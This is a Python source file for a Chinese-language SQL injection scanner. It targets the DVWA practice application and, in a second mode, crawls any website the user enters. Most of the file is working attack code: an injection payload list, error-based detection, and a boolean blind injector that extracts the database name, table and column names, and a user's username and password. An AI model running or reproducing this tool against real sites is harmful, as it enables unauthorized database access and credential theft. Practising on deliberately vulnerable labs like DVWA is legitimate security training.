import sys
import os
import requests
import urllib.parse
import time
import json
import re
import urllib3
from typing import Dict, List, Tuple, Optional, Any
from colorama import Fore, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== 配置相对路径 ==========
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
# =================================

# 导入爬虫模块
try:
    from crawler import VulnerabilityCrawler
except ImportError:
    print(f"{Fore.RED}[ERROR] 无法导入爬虫模块 crawler.py")
    sys.exit(1)

try:
    from DVWAlogin import DvwaLogin

    print(f"{Fore.GREEN}[INFO] 成功导入DVWA登录模块")
except ImportError as e:
    print(f"{Fore.RED}[ERROR] 无法导入DVWA登录模块: {e}")
    print(f"{Fore.YELLOW}[INFO] 请检查文件路径是否正确")
    sys.exit(1)

# 初始化colorama
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class IntegratedSQLScanner:
    """SQL注入扫描器（仅错误注入）- DVWA专用，完全不变"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = None
        self.base_url = None

        # 扫描结果
        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'injection_points_found': 0
        }

        # SQL注入payload库（仅保留错误注入）
        self.payloads = {
            'error_based': [
                "'", "''", "`", "\\'", "\"", "\\\"", ";",
                "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1",
                "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#",
                "' OR 1=1-- -", "' OR 1=1/*"
            ]
        }

        # 数据库指纹特征（正则表达式）
        self.db_fingerprints = {
            'mysql': [
                r'you have an error in your sql syntax',
                r'check the manual that corresponds to your mysql server version',
                r'mysql'
            ],
            'mssql': [
                r'microsoft (?:sql )?server',
                r'victim of odbc',
                r'odbc driver',
                r'unclosed quotation mark',
                r'closed quotation mark'
            ],
            'oracle': [
                r'ora-\d{5}',
                r'oracle error',
                r'pl/sql',
                r'oracle'
            ],
            'postgresql': [
                r'error: syntax error at or near',
                r'postgresql',
                r'pg_'
            ]
        }

    def setup_session(self, dvwa_login_instance: DvwaLogin):
        """设置会话和基础URL"""
        session_info = dvwa_login_instance.get_session_info()
        if not session_info:
            print(f"{Fore.RED}[ERROR] 无法获取会话信息，请先登录")
            return False

        self.session = session_info['session']
        self.base_url = session_info['base_url']
        print(f"{Fore.GREEN}[INFO] 会话设置成功")
        print(f"{Fore.CYAN}[INFO] 基础URL: {self.base_url}")
        return True

    def parse_parameters(self, url: str) -> Dict[str, List[str]]:
        """解析URL参数"""
        parsed = urllib.parse.urlparse(url)
        params = {}

        if parsed.query:
            query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params.update(query_params)

        return params

    def send_request(self, url: str, method: str = 'GET',
                     data: Dict = None, params: Dict = None) -> Tuple[bool, Optional[requests.Response]]:
        """发送HTTP请求（统一处理）"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)

            return True, response

        except requests.RequestException as e:
            print(f"{Fore.RED}[ERROR] 请求失败: {e}")
            return False, None

    def detect_db_type(self, response_text: str) -> str:
        """使用正则指纹检测数据库类型"""
        if not response_text:
            return 'unknown'

        for db_type, patterns in self.db_fingerprints.items():
            for pattern in patterns:
                try:
                    if re.search(pattern, response_text, flags=re.IGNORECASE):
                        return db_type
                except re.error:
                    # 正则编译失败，退回到简单包含判断
                    if pattern.lower() in response_text.lower():
                        return db_type
        return 'unknown'

    def discover_injection_points(self, target_url: str) -> List[Dict[str, Any]]:
        """发现SQL注入点 - Error-based 检测"""
        print(f"{Fore.CYAN}[INFO] 开始发现注入点...")

        injection_points = []
        parsed_params = self.parse_parameters(target_url)

        # 过滤掉按钮类参数
        ignore_params = {'submit', 'btn', 'button', 'action'}
        testable_params = {k: v for k, v in parsed_params.items()
                           if k.lower() not in ignore_params}

        if not testable_params:
            print(f"{Fore.YELLOW}[WARNING] 未发现可测试参数")
            return injection_points

        print(f"{Fore.GREEN}[INFO] 发现 {len(testable_params)} 个可测参数: {list(testable_params.keys())}")

        for param_name, param_values in testable_params.items():
            print(f"{Fore.CYAN}[TEST] 测试参数: {param_name}")

            # 保存原始值
            original_value = param_values[0] if param_values else ""

            for payload in self.payloads['error_based']:
                # 保留原始值并追加payload
                test_params = {}
                for k, v in parsed_params.items():
                    if k == param_name:
                        test_params[k] = original_value + payload
                    else:
                        test_params[k] = v[0] if v else ""

                success, response = self.send_request(
                    target_url.split('?')[0],
                    params=test_params
                )

                if not success or response is None or response.status_code != 200:
                    continue

                response_text = response.text
                db_type = self.detect_db_type(response_text)

                if db_type != 'unknown':
                    injection_point = {
                        'parameter': param_name,
                        'payload': payload,
                        'type': 'error_based',
                        'db_type': db_type,
                        'confidence': 'high',
                        'original_value': original_value
                    }
                    injection_points.append(injection_point)
                    print(f"{Fore.GREEN}[FOUND] {param_name} -> {db_type} (payload: {payload})")

        self.results['parameters_tested'] = len(testable_params)
        self.results['injection_points_found'] = len(injection_points)
        return injection_points

    def generate_report(self) -> Dict[str, Any]:
        """生成扫描报告"""
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        report = {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': self.results['parameters_tested'],
                'injection_points_found': self.results['injection_points_found'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "使用参数化查询或预编译语句",
                "实施输入验证和过滤",
                "使用Web应用防火墙(WAF)",
                "最小权限原则配置数据库账户",
                "定期进行安全测试和代码审计"
            ]
        }

        return report

    def scan_dvwa(self, dvwa_url: str = None):
        """扫描DVWA的SQL注入漏洞（仅错误注入）"""
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[ERROR] 请先设置会话")
            return None

        # 准备目标URL
        if not dvwa_url:
            target_url = f"{self.base_url}/vulnerabilities/sqli/?id=1&Submit=Submit"
        else:
            target_url = dvwa_url

        self.results['target_url'] = target_url
        print(f"{Fore.YELLOW}[START] 开始SQL注入扫描: {target_url}")

        # 解析参数并过滤
        parsed_params = self.parse_parameters(target_url)
        ignore_params = {'submit', 'btn', 'button', 'action'}
        testable_params = {k: v for k, v in parsed_params.items()
                           if k.lower() not in ignore_params}

        if not testable_params:
            print(f"{Fore.YELLOW}[WARNING] 未发现可测试参数")
            return self.generate_report()

        # 执行Error-based注入测试
        print(f"{Fore.CYAN}{'=' * 50}")
        print(f"{Fore.CYAN}[INFO] 开始Error-based注入测试...")
        print(f"{Fore.CYAN}{'=' * 50}")

        injection_points = self.discover_injection_points(target_url)

        for point in injection_points:
            self.results['vulnerabilities'].append({
                'parameter': point['parameter'],
                'type': point['type'],
                'db_type': point.get('db_type', 'unknown'),
                'confidence': point['confidence'],
                'payload': point['payload']
            })
            print(f"{Fore.GREEN}[✓] Error注入: {point['payload']}")

        # 生成报告
        print(f"{Fore.CYAN}{'=' * 50}")
        print(f"{Fore.GREEN}扫描完成！生成报告中...")
        return self.generate_report()


class BlindSQLInjector:
    """布尔盲注注入器 - 完全不变"""

    def __init__(self, session: requests.Session, base_url: str, cookie: str, timeout: int = 10):
        self.session = session
        self.base_url = base_url
        self.cookie = cookie
        self.timeout = timeout
        self.true_indicator = "User ID exists in the database"
        self.sleep_between_req = 0.06  # 60ms
        self.max_db_name_len = 50
        self.max_tables = 100
        self.max_columns = 60
        self.min_char = 32
        self.max_char = 126

        # 扫描结果
        self.results = {
            'target_url': None,
            'scan_time': None,
            'vulnerabilities': [],
            'extracted_data': {}
        }

    def send_blind_request(self, payload: str) -> bool:
        """发送盲注请求并返回结果"""
        try:
            target_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
            params = {'id': payload, 'Submit': 'Submit'}
            headers = {
                'User-Agent': 'PythonScanner/1.0',
                'Cookie': self.cookie
            }

            response = self.session.get(
                target_url,
                params=params,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            # 检查响应是否包含true指示器
            result = self.true_indicator in response.text
            time.sleep(self.sleep_between_req)
            return result

        except Exception as e:
            print(f"{Fore.RED}[ERROR] 盲注请求失败: {e}")
            return False

    def binary_search_length(self, expression: str, min_val: int, max_val: int) -> int:
        """二分查找长度"""
        low, high = min_val, max_val
        while low <= high:
            mid = (low + high) // 2
            payload = f"1' AND LENGTH({expression})>{mid}#"
            if self.send_blind_request(payload):
                low = mid + 1
            else:
                high = mid - 1

        candidate = low
        if min_val <= candidate <= max_val:
            verify_payload = f"1' AND LENGTH({expression})={candidate}#"
            if self.send_blind_request(verify_payload):
                return candidate
        return -1

    def binary_search_int(self, expression: str, min_val: int, max_val: int) -> int:
        """二分查找整数值"""
        low, high = min_val, max_val
        while low <= high:
            mid = (low + high) // 2
            payload = f"1' AND ({expression})>{mid}#"
            if self.send_blind_request(payload):
                low = mid + 1
            else:
                high = mid - 1

        candidate = low
        if min_val <= candidate <= max_val:
            verify_payload = f"1' AND ({expression})={candidate}#"
            if self.send_blind_request(verify_payload):
                return candidate
        return -1

    def binary_search_char(self, expression: str, position: int, min_char: int, max_char: int) -> int:
        """二分查找字符ASCII值"""
        low, high = min_char, max_char
        while low <= high:
            mid = (low + high) // 2
            payload = f"1' AND ASCII(SUBSTR({expression},{position},1))>{mid}#"
            if self.send_blind_request(payload):
                low = mid + 1
            else:
                high = mid - 1

        candidate = low
        if min_char <= candidate <= max_char:
            verify_payload = f"1' AND ASCII(SUBSTR({expression},{position},1))={candidate}#"
            if self.send_blind_request(verify_payload):
                return candidate
        return -1

    def extract_string(self, expression: str, max_len: int) -> str:
        """提取字符串"""
        length = self.binary_search_length(expression, 1, max_len)
        if length <= 0:
            return ""

        result = []
        for pos in range(1, length + 1):
            char_code = self.binary_search_char(expression, pos, self.min_char, self.max_char)
            if char_code > 0:
                result.append(chr(char_code))
            else:
                result.append('?')
        return ''.join(result)

    def extract_table_names(self, count: int) -> List[str]:
        """多线程提取表名"""
        tables = []

        def get_table_by_index(index: int) -> Tuple[int, str]:
            expression = f"(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1)"
            name = self.extract_string(expression, 60)
            return index, name

        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {executor.submit(get_table_by_index, i): i for i in range(count)}
            for future in as_completed(futures):
                try:
                    index, name = future.result()
                    if name:
                        tables.append((index, name))
                        print(f"{Fore.GREEN}[EXTRACT] 表 {index}: {name}")
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] 获取表名失败: {e}")

        tables.sort(key=lambda x: x[0])
        return [name for _, name in tables]

    def extract_column_names(self, table_name: str, count: int) -> List[str]:
        """多线程提取列名"""
        columns = []

        def get_column_by_index(index: int) -> Tuple[int, str]:
            expression = f"(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {index},1)"
            name = self.extract_string(expression, 60)
            return index, name

        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {executor.submit(get_column_by_index, i): i for i in range(count)}
            for future in as_completed(futures):
                try:
                    index, name = future.result()
                    if name:
                        columns.append((index, name))
                        print(f"{Fore.GREEN}[EXTRACT] 列 {index}: {name}")
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] 获取列名失败: {e}")

        columns.sort(key=lambda x: x[0])
        return [name for _, name in columns]

    def scan(self, dvwa_url: str = None) -> Dict[str, Any]:
        """执行完整盲注扫描"""
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[ERROR] 会话无效")
            return None

        # 准备目标URL
        target_url = dvwa_url or f"{self.base_url}/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
        self.results['target_url'] = target_url

        print(f"{Fore.YELLOW}[START] 开始布尔盲注扫描: {target_url}")

        # 1. 检查注入点
        print(f"{Fore.CYAN}[INFO] 检查注入点...")
        test_payload = "1' OR 1=1#"
        if not self.send_blind_request(test_payload):
            print(f"{Fore.RED}[ERROR] 未发现有效注入点")
            return None

        print(f"{Fore.GREEN}[FOUND] 注入点存在: {test_payload}")

        # 2. 添加漏洞信息
        self.results['vulnerabilities'].append({
            'parameter': 'id',
            'type': 'boolean_blind',
            'confidence': 'high',
            'payload': test_payload
        })

        # 3. 提取数据库信息
        print(f"{Fore.CYAN}[INFO] 提取数据库信息...")
        db_name = self.extract_string("DATABASE()", self.max_db_name_len)
        self.results['extracted_data']['database_name'] = db_name
        print(f"{Fore.GREEN}[EXTRACT] 数据库名: {db_name}")

        # 4. 提取表信息
        print(f"{Fore.CYAN}[INFO] 提取表数量...")
        table_count = self.binary_search_int(
            "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()", 0, self.max_tables)
        print(f"{Fore.GREEN}[EXTRACT] 表数量: {table_count}")

        if table_count > 0:
            print(f"{Fore.CYAN}[INFO] 提取表名...")
            tables = self.extract_table_names(table_count)
            self.results['extracted_data']['tables'] = tables

            # 5. 提取users表列信息
            if 'users' in tables:
                print(f"{Fore.CYAN}[INFO] 提取'users'表列数量...")
                col_count = self.binary_search_int(
                    "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'",
                    0, self.max_columns)
                print(f"{Fore.GREEN}[EXTRACT] 'users'表列数量: {col_count}")

                if col_count > 0:
                    print(f"{Fore.CYAN}[INFO] 提取'users'表列名...")
                    columns = self.extract_column_names('users', col_count)
                    self.results['extracted_data']['users_columns'] = columns

                    # 6. 尝试提取用户数据
                    if 'user' in columns and 'password' in columns:
                        print(f"{Fore.CYAN}[INFO] 提取第一个用户信息...")
                        username = self.extract_string("(SELECT user FROM users LIMIT 0,1)", 60)
                        password = self.extract_string("(SELECT password FROM users LIMIT 0,1)", 200)
                        self.results['extracted_data']['first_user'] = {
                            'username': username,
                            'password': password
                        }
                        print(f"{Fore.GREEN}[EXTRACT] 用户名: {username}")
                        print(f"{Fore.GREEN}[EXTRACT] 密码: {password}")

        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        """生成盲注扫描报告"""
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        report = {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'vulnerability_type': 'boolean_blind',
                'parameters_tested': 1,
                'injection_points_found': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'extracted_data': self.results['extracted_data'],
            'recommendations': [
                "使用参数化查询或预编译语句",
                "实施输入验证和过滤",
                "使用Web应用防火墙(WAF)",
                "最小权限原则配置数据库账户",
                "定期进行安全测试和代码审计"
            ]
        }

        return report


class NormalSQLScanner:
    """普通网站SQL注入扫描器（集成自动爬取）"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SQLScanner/1.0"})
        self.tested_params = set()  # 存储 (base_url, param_name)
        self.tested_fields = set()  # 存储 (form_url, field_name)
        # 智能筛选：只测试这些关键词相关的参数
        self.sql_keywords = {'id', 'user', 'name', 'search', 'query', 'keyword',
                             'email', 'phone', 'code', 'category', 'filter', 'type'}
        # 黑名单：绝对跳过的参数
        self.blacklist = {'submit', 'btn', 'token', 'csrf_token', 'captcha',
                          'action', 'do', 'save', 'delete', 'reset'}
        self.results = {
            'target_url': '普通网站多页面',
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'injection_points_found': 0
        }

        # Payload与DVWA版本保持一致
        self.payloads = [
            "'", "''", "`", "\\'", "\"", "\\\"", ";",
            "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1",
            "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#",
            "' OR 1=1-- -", "' OR 1=1/*"
        ]

        self.db_fingerprints = {
            'mysql': [r'you have an error in your sql syntax', r'check the manual.*mysql', r'mysql'],
            'mssql': [r'microsoft (?:sql )?server', r'unclosed quotation mark', r'odbc driver'],
            'oracle': [r'ora-\d{5}', r'oracle error', r'pl/sql'],
            'postgresql': [r'error: syntax error at or near', r'postgresql', r'pg_']
        }

    def _should_test_param(self, param_name: str) -> bool:
        """智能判断参数是否值得测试"""
        param_lower = param_name.lower()

        # 1. 黑名单直接跳过
        if param_lower in self.blacklist:
            return False

        # 2. 包含SQL相关关键词则测试
        if any(keyword in param_lower for keyword in self.sql_keywords):
            return True

        # 3. 其他参数跳过（如：button_color, layout_style等）
        return False

    def detect_db_type(self, text: str) -> str:
        """检测数据库类型"""
        if not text:
            return 'unknown'
        for db_type, patterns in self.db_fingerprints.items():
            for pattern in patterns:
                try:
                    if re.search(pattern, text, re.IGNORECASE):
                        return db_type
                except:
                    if pattern.lower() in text.lower():
                        return db_type
        return 'unknown'

    def test_url_params(self, url: str, param_list: List[str]) -> List[Dict]:
        """测试URL参数注入（新增去重逻辑 + 智能筛选）"""
        vulns = []
        parsed = urllib.parse.urlparse(url)
        all_params = urllib.parse.parse_qs(parsed.query)
        base_url = url.split('?')[0]  # 用于去重的基准URL

        for param_name in param_list:
            # ===== 去重检查：跳过已测试的参数 =====
            param_key = (base_url, param_name)
            if param_key in self.tested_params:
                print(f"{Fore}[-] 跳过重复参数: {param_name}")
                continue
            self.tested_params.add(param_key)
            # ======================================

            # ===== 智能筛选：只测试相关参数 =====
            if not self._should_test_param(param_name):
                print(f"{Fore}[-] 跳过无关参数: {param_name}")
                continue
            # ======================================

            print(f"{Fore.CYAN}[TEST] 测试参数: {param_name}")
            original_value = all_params.get(param_name, [""])[0]

            for payload in self.payloads:
                test_params = all_params.copy()
                test_params[param_name] = [original_value + payload]

                try:
                    response = self.session.get(
                        base_url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )

                    db_type = self.detect_db_type(response.text)
                    if db_type != 'unknown':
                        vulns.append({
                            'parameter': param_name,
                            'payload': payload,
                            'db_type': db_type,
                            'url': url
                        })
                        print(f"{Fore.GREEN}[FOUND] {param_name} -> {db_type}")
                        break
                except:
                    continue

        return vulns

    def test_form(self, form_url: str, method: str, form_data: Dict) -> List[Dict]:
        """测试表单注入（新增去重逻辑 + 智能筛选）"""
        vulns = []

        for field_name in form_data.keys():
            # ===== 去重检查：跳过已测试的字段 =====
            field_key = (form_url, field_name)
            if field_key in self.tested_fields:
                print(f"{Fore}[-] 跳过重复字段: {field_name}")
                continue
            self.tested_fields.add(field_key)
            # ======================================

            # ===== 智能筛选：只测试相关字段 =====
            if not self._should_test_param(field_name):
                print(f"{Fore}[-] 跳过无关字段: {field_name}")
                continue
            # ======================================

            print(f"{Fore.CYAN}[TEST] 测试表单字段: {field_name}")

            for payload in self.payloads:
                test_data = form_data.copy()
                original_value = test_data.get(field_name, "")
                test_data[field_name] = original_value + payload

                try:
                    if method.upper() == 'GET':
                        response = self.session.get(form_url, params=test_data, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.post(form_url, data=test_data, timeout=self.timeout, verify=False)

                    db_type = self.detect_db_type(response.text)
                    if db_type != 'unknown':
                        vulns.append({
                            'form_url': form_url,
                            'field': field_name,
                            'payload': payload,
                            'db_type': db_type,
                            'method': method
                        })
                        print(f"{Fore.GREEN}[FOUND] 字段 {field_name} -> {db_type}")
                        break
                except:
                    continue

        return vulns

    def crawl_and_scan(self, base_url: str, max_depth: int = 2) -> Dict[str, Any]:
        """自动爬取并扫描"""
        print(f"{Fore.YELLOW}[INFO] 开始自动爬取目标网站...")
        print(f"{Fore.CYAN}目标: {base_url}")
        print(f"{Fore.CYAN}深度: {max_depth}")
        print("-" * 50)

        # 执行爬取
        crawler = VulnerabilityCrawler(base_url, max_depth=max_depth)
        crawler.crawl(base_url)

        # 显示爬取统计
        results = crawler.get_results()

        # 保存爬取结果
        crawl_file = crawler.save_results()
        print(f"\n{Fore.GREEN}[✓] 爬取完成，结果已保存")

        # 开始扫描
        print(f"{Fore.YELLOW}[INFO] 开始SQL注入扫描...")
        print("-" * 50)

        all_vulns = []
        tested = 0

        # 测试URL参数
        if results['url_params']:
            print(f"{Fore.CYAN}[INFO] 测试URL参数注入点...")
            for item in results['url_params']:
                url = item['url']
                params = item['params']
                tested += len(params)
                print(f"\n{Fore.BLUE}[URL] {url}")
                vulns = self.test_url_params(url, params)
                all_vulns.extend(vulns)

        # 测试表单
        if results['forms']:
            print(f"{Fore.CYAN}{'=' * 50}")
            print(f"{Fore.CYAN}[INFO] 测试表单注入点...")
            for item in results['forms']:
                form_url = item['url']
                method = item['method']
                form_data = item['form_data']
                tested += len(form_data)
                print(f"\n{Fore.BLUE}[FORM] {form_url} [{method.upper()}]")
                vulns = self.test_form(form_url, method, form_data)
                all_vulns.extend(vulns)

        self.results['vulnerabilities'] = all_vulns
        self.results['parameters_tested'] = tested
        self.results['injection_points_found'] = len(all_vulns)

        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        """生成报告"""
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': self.results['parameters_tested'],
                'injection_points_found': self.results['injection_points_found'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "使用参数化查询或预编译语句",
                "实施输入验证和过滤",
                "使用Web应用防火墙(WAF)",
                "最小权限原则配置数据库账户"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        """打印报告"""
        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.CYAN}SQL注入扫描报告 (普通网站)")
        print(f"{Fore.YELLOW}{'=' * 60}")

        summary = report['scan_summary']
        print(f"{Fore.GREEN}目标: {summary['target_url']}")
        print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
        print(f"{Fore.GREEN}发现漏洞: {summary['total_vulnerabilities']}")

        if report['vulnerabilities']:
            print(f"\n{Fore.RED}{'!' * 60}")
            print(f"{Fore.RED}发现SQL注入漏洞!")
            print(f"{Fore.RED}{'!' * 60}")

            for i, vuln in enumerate(report['vulnerabilities'], 1):
                print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
                if 'parameter' in vuln:
                    print(f"{Fore.CYAN}参数: {vuln['parameter']}")
                if 'field' in vuln:
                    print(f"{Fore.CYAN}表单字段: {vuln['field']}")
                print(f"{Fore.CYAN}Payload: {vuln['payload']}")
                print(f"{Fore.CYAN}数据库: {vuln['db_type']}")
                print(f"{Fore.CYAN}位置: {vuln.get('url') or vuln.get('form_url')}")
        else:
            print(f"\n{Fore.GREEN}{'✓' * 60}")
            print(f"{Fore.GREEN}未发现SQL注入漏洞")
            print(f"{Fore.GREEN}{'✓' * 60}")


def print_report(report: Dict[str, Any], scan_type: str):
    """统一打印DVWA扫描报告 - 完全不变"""
    print(f"\n{Fore.YELLOW}{'=' * 60}")
    print(f"{Fore.CYAN}SQL注入扫描报告 ({scan_type})")
    print(f"{Fore.YELLOW}{'=' * 60}")

    summary = report['scan_summary']
    print(f"{Fore.GREEN}目标URL: {summary['target_url']}")
    print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
    print(f"{Fore.GREEN}扫描类型: {scan_type}")

    if scan_type == "错误注入":
        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
        print(f"{Fore.GREEN}发现注入点: {summary['injection_points_found']}")

    if report.get('vulnerabilities'):
        print(f"\n{Fore.RED}{'!' * 60}")
        print(f"{Fore.RED}发现SQL注入漏洞!")
        print(f"{Fore.RED}{'!' * 60}")

        for i, vuln in enumerate(report['vulnerabilities'], 1):
            print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
            print(f"{Fore.CYAN}参数: {vuln.get('parameter', '未知')}")
            print(f"{Fore.CYAN}类型: {vuln.get('type', '未知')}")
            print(f"{Fore.CYAN}置信度: {vuln.get('confidence', '未知')}")
            print(f"{Fore.CYAN}Payload: {vuln.get('payload', 'N/A')}")

    else:
        print(f"\n{Fore.GREEN}{'✓' * 60}")
        print(f"{Fore.GREEN}未发现SQL注入漏洞")
        print(f"{Fore.GREEN}{'✓' * 60}")

    # 显示提取的数据（盲注）
    if scan_type == "布尔盲注" and 'extracted_data' in report:
        data = report['extracted_data']
        print(f"\n{Fore.CYAN}提取的数据:")
        if 'database_name' in data:
            print(f"  {Fore.GREEN}数据库名: {data['database_name']}")
        if 'tables' in data:
            print(f"  {Fore.GREEN}表: {', '.join(data['tables'])}")
        if 'users_columns' in data:
            print(f"  {Fore.GREEN}users表列: {', '.join(data['users_columns'])}")
        if 'first_user' in data:
            user = data['first_user']
            print(f"  {Fore.GREEN}第一个用户: {user.get('username', 'N/A')} / {user.get('password', 'N/A')}")

    print(f"\n{Fore.CYAN}安全建议:")
    for i, recommendation in enumerate(report['recommendations'], 1):
        print(f"  {i}. {recommendation}")


def main():
    """主函数 - DVWA流程完全不变，普通网站自动爬取"""
    print(f"{Fore.CYAN}整合版SQL注入扫描器")
    print(f"{Fore.CYAN}支持: DVWA靶场 (错误注入+布尔盲注) / 普通网站(自动爬取)")
    print("=" * 50)

    # 选择扫描模式
    print("请选择扫描模式:")
    print("1. 扫描DVWA靶场 (保留错误注入和布尔盲注)")
    print("2. 扫描普通网站 (自动爬取+错误注入)")
    choice = input("请输入选项 (1 或 2): ").strip()

    # ==================== DVWA流程 - 完全不变 ====================
    if choice == '1':
        dvwa_url = input("请输入DVWA的URL (例如: http://192.168.26.130:8085): ").strip()
        if not dvwa_url:
            print(f"{Fore.RED}URL不能为空")
            return

        print(f"{Fore.CYAN}[1/4] 初始化登录模块...")
        dvwa_login = DvwaLogin()

        print(f"{Fore.CYAN}[2/4] 登录DVWA...")
        if not dvwa_login.login(dvwa_url):
            print(f"{Fore.RED}登录失败，程序退出")
            return

        dvwa_login.test_connection()

        # 获取会话信息
        session_info = dvwa_login.get_session_info()
        if not session_info:
            print(f"{Fore.RED}无法获取会话信息")
            return

        # 让用户选择扫描类型
        print("\n" + "=" * 50)
        print(f"{Fore.CYAN}请选择扫描类型:")
        print("1. 错误注入 (Error-based)--（快速发现漏洞）")
        print("2. 布尔盲注 (Boolean Blind)--（深度数据提取）")
        scan_choice = input("请输入选项 (1 或 2): ").strip()

        if scan_choice == '1':
            scan_type = "错误注入"
            print(f"{Fore.CYAN}[3/4] 初始化错误注入扫描器...")
            scanner = IntegratedSQLScanner(timeout=15)

            if not scanner.setup_session(dvwa_login):
                print(f"{Fore.RED}设置会话失败")
                return

            print(f"{Fore.CYAN}[4/4] 开始错误注入扫描...")
            report = scanner.scan_dvwa()

        elif scan_choice == '2':
            scan_type = "布尔盲注"
            print(f"{Fore.CYAN}[3/4] 初始化盲注扫描器...")

            # 构建cookie字符串
            session_cookies = session_info['session'].cookies
            cookie_parts = []
            for name, value in session_cookies.items():
                cookie_parts.append(f"{name}={value}")

            # 从DVWAlogin获取安全等级cookie
            security_cookie = getattr(dvwa_login, 'security_cookie', 'security=low')
            if 'security=' not in security_cookie:
                security_cookie = 'security=low'

            full_cookie = f"{'; '.join(cookie_parts)}; {security_cookie}"

            injector = BlindSQLInjector(
                session=session_info['session'],
                base_url=session_info['base_url'],
                cookie=full_cookie,
                timeout=15
            )

            print(f"{Fore.CYAN}[4/4] 开始布尔盲注扫描...")
            report = injector.scan()

        else:
            print(f"{Fore.RED}无效选项")
            return

        if report:
            print_report(report, scan_type)

            # 保存报告到相对路径
            report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
            os.makedirs(report_dir, exist_ok=True)

            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"dvwa_{'error' if scan_choice == '1' else 'blind'}_scan_report_{timestamp}.json"
            filepath = os.path.join(report_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)

            print(f"{Fore.GREEN}报告已保存到: {filepath}")
        else:
            print(f"{Fore.RED}扫描失败")

    # ==================== 普通网站流程 - 自动爬取 ====================
    elif choice == '2':
        base_url = input("请输入目标网站首页URL: ").strip()
        if not base_url:
            print(f"{Fore.RED}URL不能为空")
            return

        # 询问爬取深度
        depth_input = input("请输入爬取深度 (默认2): ").strip()
        max_depth = int(depth_input) if depth_input.isdigit() else 2

        # 开始自动爬取并扫描
        print(f"\n{Fore.CYAN}[1/2] 初始化扫描器...")
        scanner = NormalSQLScanner(timeout=10)

        print(f"{Fore.CYAN}[2/2] 自动爬取并扫描...")
        print("=" * 50)
        report = scanner.crawl_and_scan(base_url, max_depth)

        if report:
            scanner.print_report(report)

            # 保存报告
            report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
            os.makedirs(report_dir, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"normal_sql_report_{timestamp}.json"
            filepath = os.path.join(report_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)

            print(f"\n{Fore.GREEN}报告已保存: {filepath}")
        else:
            print(f"{Fore.RED}扫描失败")

    else:
        print(f"{Fore.RED}无效选项")
        return


if __name__ == "__main__":
    main()